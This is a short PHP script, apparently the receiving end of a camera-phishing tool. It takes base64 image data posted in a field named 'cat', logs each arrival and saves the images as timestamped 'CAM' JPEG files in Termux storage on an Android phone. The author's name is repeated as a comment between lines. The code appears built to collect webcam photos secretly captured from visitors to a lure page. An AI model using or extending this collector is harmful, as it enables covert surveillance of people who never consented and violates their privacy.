<?php
# Ahmad Khoirul Marzuqin
date_default_timezone_set ("Asia/Jakarta");
# Ahmad Khoirul Marzuqin
$date = date('d-m-Y H:i:s');
# Ahmad Khoirul Marzuqin
$imageData=$_POST['cat'];
# Ahmad Khoirul Marzuqin
if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");
}
# Ahmad Khoirul Marzuqin
$filteredData=substr($imageData, strpos($imageData, ",")+1);
# Ahmad Khoirul Marzuqin
$unencodedData=base64_decode($filteredData);
# Ahmad Khoirul Marzuqin
$fp = fopen( '/data/data/com.termux/files/home/storage/shared/CAM '.$date.'.jpg', 'wb' );
# Ahmad Khoirul Marzuqin
fwrite( $fp, $unencodedData);
# Ahmad Khoirul Marzuqin
fclose( $fp );
# Ahmad Khoirul Marzuqin
exit();
# Ahmad Khoirul Marzuqin
?>